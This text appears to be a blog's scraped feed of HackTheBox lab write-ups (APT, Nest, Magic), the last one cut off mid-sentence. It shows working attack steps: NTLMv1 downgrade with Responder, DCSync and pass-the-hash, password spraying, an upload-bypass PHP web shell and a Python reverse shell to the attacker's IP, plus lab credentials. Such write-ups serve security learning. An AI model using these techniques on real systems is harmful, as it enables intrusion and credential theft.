Access henry.vinson_adm credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson_adm -p \u0026#39;G1#Ny5@2dvht\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents\u0026gt; *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Desktop\u0026gt; type user.txt 745212a817f60f27befd...\u0026lt;SNIP\u0026gt;... Privilege Escalation Shell as administrator Enumeration Performing a text file enumeration finds a PowerShell history file.\n*Evil-WinRM* PS C:\\Users\\henry.vinson_adm\u0026gt; gci -Path C:\\Users -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force ...\u0026lt;SNIP\u0026gt;... Directory: C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/10/2020 10:58 AM 458 ConsoleHost_history.txt *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\u0026gt; type \u0026#34;C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; $Cred = get-credential administrator invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path \u0026#34;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\u0026#34; lmcompatibilitylevel -Type DWORD -Value 2 -Force} From Wikipedia:\n Send NTLM response only: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.\n With lmcompatibilitylevel = 2, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail here.\nThere is a site called https://crack.sh that provides a service for cracking NTLMv1 hash using rainbow tables for a specific challenge of \u0026ldquo;1122334455667788\u0026rdquo;.\nThe idea here is to force APT to make a request (challenge-response) to the server that the attacker controls, which has been configured to send the string \u0026ldquo;1122334455667788\u0026rdquo; as the challenge (after downgrading the authentication process to NTLMv1).\nAfter the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to crack.sh for cracking and obtain NTLM/NT hash of APT afterward.\n Note:\n NetNTLM/NTLMv1 is an authentication protocol NetNTLM/NTLMv1 hash != NTLM hash NetNTLM/NTLMv1 hash contains NTLM hash   Stealing NTLMv1 hash via MpCmdRun.exe MpCmdRun.exe is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.\n This article explaining how authentication proccess over SMB work\n For this, I’ll need to edit /etc/responder/Responder.conf first, and change the challenge from \u0026ldquo;random\u0026rdquo; to \u0026ldquo;1122334455667788\u0026rdquo;.\nAfter that, I can start Responder to listen on my tun0 interface and specify the --lm option which will downgrade the authentication to NTLMv1.\n→ root@iamf «~» «10.10.14.72» $ responder -I tun0 --lm __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 2.3.4.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [OFF] FTP server [OFF] IMAP server [OFF] POP3 server [OFF] SMTP server [OFF] DNS server [ON] LDAP server [ON] RDP server [OFF] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [ON] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.72] Challenge set [1122334455667788] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;] [+] Listening for events... Now on APT, I can force authentication with MpCmdRun.exe (located on C:\\Program Files\\Windows Defender), and it errors out.\n*Evil-WinRM* PS C:\\Program Files\\Windows Defender\u0026gt;.\\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.72\\notexist Scan starting... CmdTool: Failed with hr = 0x80508023. Check C:\\Users\\HENRY~2.VIN\\AppData\\Local\\Temp\\MpCmdRun.log for more information  Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address\n But on my Kali, responder has successfully captured the hash of APT$, the computer account of the box.\n...\u0026lt;snip\u0026gt;.. [+] Listening for events... [SMB] NTLMv1 Client : 10.10.10.213 [SMB] NTLMv1 Username : HTB\\APT$ [SMB] NTLMv1 Hash : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788 When there is no credentials are specified explicitly, Windows uses the current credentials.\nHowever, because Windows Defender is already running as SYSTEM (builtin localsystem), (afaik) it can not be downgraded to a lower privilege for authentication. It also won’t authenticate as SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.\nCracking NTLMv1 hash I can submit the hash to https://crack.sh/ with the following format.\nNTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384  It will automatically detect the input.\n Not even a minute passed, it sent me the result.\n The key is d167c3238864b12f5f82feae86a7f798, it\u0026rsquo;s the NTLM hash/NThash that can be used for pass-the-hash attack.\nCredential Dumping NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using secretsdump.py. I\u0026rsquo;ll take only the administrator hash.\n→ root@iamf «~» «10.10.14.72» $ secretsdump.py \u0026#39;htb.local/APT$@apt\u0026#39; -hashes \u0026#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798\u0026#39; -just-dc-user administrator Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2::: ...\u0026lt;snip\u0026gt;.. [*] Cleaning up... I can login into the box using evil-winrm with the administrator hash I obtained.\n→ root@iamf «~» «10.10.14.72» $ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2 Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ..\\Desktop\\root.txt a1f204c405aea36388...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt;  References   https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc\n  https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4\n  https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/\n  https://en.wikipedia.org/wiki/NT_LAN_Manager\n  https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf\n  https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\n  https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/\n  https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026\n  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-apt/","summary":"APT is an insane difficulty Windows machine from HackTheBox where deep understanding of Windows enumeration and internals is required. It starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named ServerAlive() can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain users' hashes.","tags":["Windows","Active-Directory","Domain-controller","MSRPC","IOXIDResolver","IObjectExporter","Network-relay","IPv6","Windows-registry","socat","NTLMv1","MpCmdRun","Responder","DCSync","secretsdump.py","reg.py","evil-winrm"],"title":"HackTheBox - APT"},{"content":"Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.\nNest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is also a VB project inside a directory that can not be reached unless you visit its full path. There is a decrypt function on the project that can be used to decrypt c.smith\u0026rsquo;s password. Enumerating c.smith home directory discovers a password for enabling debug mode of a custom application. Debug mode in the application unlocks new options, which can then be used to read the application\u0026rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, I\u0026rsquo;m able to decrypted the administrator password, and then use it gain administrator access.\nSkills Learned  SMB enumeration Alternate Data Stream Reversing .NET  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux smbget - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap → root@iamf «nest» «192.168.43.234» $ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178 Nmap scan report for htb.nest (10.10.10.178) PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; Host script results: |_clock-skew: -27s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-28T15:16:46 |_ start_date: 2020-04-28T04:20:37 nmap shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as \u0026lsquo;Reporting Service V1.2\u0026rsquo;.\nEnumeration TCP 445 - SMB Anonymous access is allowed here.\n→ root@iamf «nest» «192.168.43.234» $ smbclient -N -L //10.10.10.178/ Data share Enumeration on Data share with recurse mode shows two text files.\nOne of them is empty while the other one contains credentials for TempUser:Welcome2019.\n→ root@iamf «smb» «192.168.43.234» $ cat loot/Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR With TempUsers, I could access the Secure$ share.\n Sorry if you annoyed by the red box, me too.\n Unfortunately, once I got to Secure$ share, I couldn\u0026rsquo;t list any single directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U \u0026#39;TempUser%welcome2019\u0026#39; //10.10.10.178/Secure$ Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; recurse on smb: \\\u0026gt; ls NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\HR\\* NT_STATUS_ACCESS_DENIED listing \\IT\\* On the other hand, I do user enumeration with rpcclient.\n With a little knowledge of scripting, I can filter the user.\n→ root@iamf «nest» «192.168.43.234» $ rpcclient -U \u0026#39;TempUser%welcome2019\u0026#39; -c \u0026#39;enumdomusers;quit\u0026#39; 10.10.10.178 | tr -d \u0026#39;[]\u0026#39; | cut -d \u0026#39;:\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 Administrator C.Smith Guest Service_HQK TempUser I did a password spray using a simple bash script with a pattern of username:username, but no luck\n#!/bin/bash for u in `cat rpcusers.txt`; do echo -n “[*] user : $u “ \u0026amp;\u0026amp; rpcclient -U “$u%$u” -c “getusername;quit” 10.10.10.178 done I also check on users' information to find a plain password in the description, but end up knowing the user flag is on c.smith.\n I went back to SMB, I decided to download all the content in the Data share.\n→ root@iamf «loot» «192.168.43.234» $ smbget -R smb://10.10.10.178/Data/ -U TempUser # or use mget * inside smbclient Here is the folder structure on Data\n→ root@iamf «Data» «192.168.43.234» $ tree . ├── IT │ ├── Archive │ ├── Configs │ │ ├── Adobe │ │ │ ├── editing.xml │ │ │ ├── Options.txt │ │ │ ├── projects.xml │ │ │ └── settings.xml │ │ ├── Atlas │ │ │ └── Temp.XML │ │ ├── DLink │ │ ├── Microsoft │ │ │ └── Options.xml │ │ ├── NotepadPlusPlus │ │ │ ├── config.xml │ │ │ └── shortcuts.xml │ │ ├── RU Scanner │ │ │ └── RU_config.xml │ │ └── Server Manager │ ├── Installs │ ├── Reports │ └── Tools ├── Production ├── Reports └── Shared ├── Maintenance │ └── Maintenance Alerts.txt └── Templates ├── HR │ └── Welcome Email.txt └── Marketing Notepad++ config on Data/IT/Configs/NotepadPlusPlus/config.xml contains interesting path.\n...\u0026lt;SNIP\u0026gt;... \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt; \u0026lt;/NotepadPlus\u0026gt; Next, on /Data/IT/Configs/RU Scanner/RU_config.xml, I found a password that belongs to c.smith\n→ root@iamf «RU Scanner» «192.168.43.234» $ cat RU_config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt; It looks like a base64 encoded at first, but it is encrypted:\n→ root@iamf «RU Scanner» «192.168.43.234» $ echo \u0026#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026#39; | base64 -d }13☺□♥□=X□J□BA□↓☺X*□Wc□f□□□?βc◄ Secure$ share User carl doesn\u0026rsquo;t appear on my enumeration with rpcclient, so after discovering this path \\\\HTB-NEST\\Secure$\\IT\\Carl\\, I went back to Secure$ share and performed a recursive download there.\n→ root@iamf «Data» «192.168.43.234» $ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser Here is the Secure$ structure.\n→ root@iamf «Secure$» «192.168.43.234» $ tree . ├── Docs │ ├── ip.txt │ └── mmc.txt ├── Reports └── VB Projects ├── Production └── WIP └── RU ├── RUScanner │ ├── bin │ │ ├── Debug │ │ └── Release │ ├── ConfigFile.vb │ ├── Module1.vb │ ├── My Project │ │ ├── Application.Designer.vb │ │ ├── Application.myapp │ │ ├── AssemblyInfo.vb │ │ ├── Resources.Designer.vb │ │ ├── Resources.resx │ │ ├── Settings.Designer.vb │ │ └── Settings.settings │ ├── obj │ │ └── x86 │ ├── RU Scanner.vbproj │ ├── RU Scanner.vbproj.user │ ├── SsoIntegration.vb │ └── Utils.vb └── RUScanner.sln I just downloaded a VB Project. Based on Module1.vb\u0026rsquo;s content, RU_config.xml is loaded to the application, and from this line .Password = Utils.DecryptString(Config.Password), I know this application able to decrypt c.smith\u0026rsquo;s password.\n→ root@iamf «WIP» «192.168.43.234» $ cat RU/RUScanner/Module1.vb Module Module1 Sub Main() Dim Config As ConfigFile = ConfigFile.LoadFromFile(\u0026#34;RU_Config.xml\u0026#34;) Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)} End Sub End Module Foothold Access as c.smith Decrypting c.smith password The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from Utils.vb, then call it on the main function. I used https://dotnetfiddle.net/ for this.\nHere is how it looks like.\nImports System Imports System.Text Imports System.Security.Cryptography Public Module Module1 Public Sub Main() Dim encryptedPassword encryptedPassword = \u0026#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026#34; Console.WriteLine(\u0026#34;Decrypted Password: \u0026#34; +Utils.DecryptString(encryptedPassword)) End Sub End Module Public Class Utils Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256) End If End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End Function End Class Now I have c.smith\u0026rsquo;s password, xRxRxPANCAK3SxRxRx\n Users share With c.smith credentials, I do more enumeration on SMB. First, I\u0026rsquo;ll look into the c.smith home directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U \u0026#39;c.smith%xRxRxPANCAK3SxRxRx\u0026#39; //10.10.10.178/Users Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\C.Smith\\\u0026gt; dir . D 0 Sun Jan 26 02:21:44 2020 .. D 0 Sun Jan 26 02:21:44 2020 HQK Reporting D 0 Thu Aug 8 19:06:17 2019 user.txt A 32 Thu Aug 8 19:05:24 2019 I downloaded those files recursively to my machine.\n→ root@iamf «c.smith» «192.168.43.234» $ tree . ├── HQK Reporting │ ├── AD Integration Module │ │ └── HqkLdap.exe │ ├── Debug Mode Password.txt │ └── HQK_Config_Backup.xml └── user.txt user.txt is the user flag.\n→ root@iamf «c.smith» «192.168.43.234» $ cat user.txt cf71b25404be5d84fd827e05f426e987 HQK_Config_Backup.xml doesn\u0026rsquo;t contains any useful information\n→ root@iamf «c.smith» «192.168.43.234» $ cat HQK\\ Reporting/HQK_Config_Backup.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ServiceSettings xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;4386\u0026lt;/Port\u0026gt; \u0026lt;QueryDirectory\u0026gt;C:\\Program Files\\HQK\\ALL QUERIES\u0026lt;/QueryDirectory\u0026gt; \u0026lt;/ServiceSettings\u0026gt; Debug Mode Password.txt is empty file. But when I thought it was empty, I asked a hint for this.\nThis file is embedded with Alternate Data Stream (ADS). By using the allinfo command on the SMB, I can see it contains another data stream, Password:$Data.\n To get that stream, I can just append :Password:$Data at the end of the file name.\nsmb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Thu Aug 8 07:06:12 PM 2019 EDT access_time: Thu Aug 8 07:06:12 PM 2019 EDT write_time: Thu Aug 8 07:08:17 PM 2019 EDT change_time: Thu Aug 8 07:08:17 PM 2019 EDT attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u0026gt; get \u0026#34;Debug Mode Password.txt\u0026#34;:Password:$DATA getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) Now I can use the cat command to see the file content.\n→ root@iamf «c.smith» «192.168.43.234» $ cat Debug\\ Mode\\ Password.txt:Password:\\$DATA WBQ201953D8w Privilege Escalation Shell as NT Authority\\System Examination on HQK Reporting Service v1.2 When visiting http://10.10.10.178:4386/, the browser return a session timeout with \u0026gt; symbol, this could imply that this service is cli-based\nWith telnet, I could access this service.\n→ root@iamf «c.smith» «192.168.43.234» $ telnet 10.10.10.178 4386 With debug mode enabled, it shows more commands.\n\u0026gt;debug WBQ201953D8w Took me a minute to understand the commands, so basically\n LIST is to list directory, SHOWQUERY is to show file content, RUNQUERY is to execute. SETDIR is change directory.  Looking up into the LDAP directory, there\u0026rsquo;s ldap.conf that contains administrator credentials with another encrypted password.\n I have a copy of HqkLdap.exe on c.smith\u0026rsquo;s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of Ldap.conf.\nReversing HQKLdap.exe Running strings HqkLdap.exe againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.\nUsing immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called dnSpy. It\u0026rsquo;s free on Github.\n dnSpy: https://github.com/0xd4d/dnSpy/releases  For this I\u0026rsquo;ll go straight to the application main function.\n To run this program properly, a config file, which is ldap.conf, must be served as an argument to the application, and it also needs the presences of HqkDbImport.exe (These two must exist in the same folder)\nSo if I run it and I don\u0026rsquo;t fulfill the check, it will complain like this:\nPS C:\\Users\\fahmi\\Desktop\u0026gt;.\\HqkLdap.exe Ldap.conf Please ensure the optional database import module is installed Next, I investigated the decrypt function, which was called on the main after the checks were completed.\n On the next block, I see ldapSearchSettings.Password is assigned to ldap.password\n From here, what I can try is:\n Remove the part of codes that used to check for the existence of HqkDbImport.exe Add another line to print out the password from ldap.Password.  I\u0026rsquo;ll use the edit feature to edit the main class.\nAlso, I’ll get rid the line that used to check the existence of HqkDbImport.exe\npublic static void Main() { checked { try { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line arguments\u0026#34;); } else if (!File.Exists(MyProject.Application.CommandLineArgs[0])) { Console.WriteLine(\u0026#34;Specified config file does not exist\u0026#34;); } else { ...\u0026lt;snip\u0026gt; ... Then I’ll add a new line code on the main function at line 56 to print ldap.Password to the console.\n I tried to compile it back but then there was an error about the unassigned local variable \u0026lsquo;enumerator\u0026rsquo;, so I deleted that variable and tried to compile it back.\n It succeeded and I can export the modified program.\nNow I can just run it and provide the ldap.conf as its argument and it works!\n The password is: XtH4nkS4Pl4y1nGX\nPass the Hash with psexec.py I can gain access as local system on the box using administrator account and the decrypted password with psexec.py\n→ root@iamf «c.smith» «192.168.43.234» $ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file nQyIIpWk.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service gfCe on 10.10.10.178..... [*] Starting service gfCe..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system  References  https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-nest/","summary":"Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.\nNest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is also a VB project inside a directory that can not be reached unless you visit its full path.","tags":["OSCP-plus","Windows","SMB","Alternate-Data-Stream","Cryptography",".NET","Reverse-engineering","psexec.py"],"title":"HackTheBox - Nest"},{"content":"Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I\u0026rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there\u0026rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.\nSkills Learned  SQL injection Bypassing Upload Filter SUID exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Exiftool - https://exiftool.org/  Reconnaissance Nmap → root@iamf «magic» «10.10.14.169» $ nmap -sC -sV -oA scans/magic 10.10.10.185 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nmap found two ports open, an HTTP service on port 80 and SSH service on port 22\nEnumeration TCP 80 - Website The home page shows a bunch of images.\nBy clicking \u0026ldquo;Views image\u0026rdquo;, I know some images located on /images/uploads and some others on /images/fulls. At the bottom page, there\u0026rsquo;s a login button that points to /login.php\nCommon credentials don\u0026rsquo;t seem to work here.\nSQL injection - Login bypass on /login.php  The login form doesn\u0026rsquo;t allows spacing between character, but it can be tricked by copy and paste.\n A basic sql injection technique ' or 1 = 1 -- -  to bypass login is work against the login page.\n In MySQL, a space after a comment is a must -- [space], because of that I added -- - to make it clear.\n We can assume the back-end query would look like this:\n...\u0026lt;some php\u0026gt;... $username = $_POST[\u0026#39;user\u0026#39;] $pwd = $_POST[\u0026#39;password\u0026#39;] ...\u0026lt;some php\u0026gt;... SELECT username, password from table.user where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$pwd\u0026#39; If I assign ' or 1 = 1 -- -  as value of $username, it becomes:\nSELECT username, password from table.user where username=\u0026#39;\u0026#39; or 1 = 1 -- -\u0026#39; and password=\u0026#39;$pwd\u0026#39; Foothold Shell as www-data Upload filter bypass Upon a successful login, the site redirects me to /upload.php. It shows up with an upload form. It only accepts a valid image file.\nAfter some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using exiftools.\n→ root@iamf «forest» «10.10.14.169» $ ./exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; iamf.jpg Next, I added .php extension right before the image extension (in my case it is .jpg, so it becomes filename.php.jpg).\nBack to /upload.php, now it accepts my php embedded image.\nI can find the uploaded file at http://htb.magic/images/uploads/.\nWhen I visit http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd, I can see the code execution is working\nShell access The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.\nI\u0026rsquo;ll enter this URL on the browser.\nhttp://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27\u0026#34; Now on my listener, it caught the shell\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 19448 bash: cannot set terminal process group (1327): Inappropriate ioctl for device bash: no job control in this shell $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Shell as theseus Enumeration I discovered a database configuration db.php5 that stores credentials after enumerating the current working directory with the find 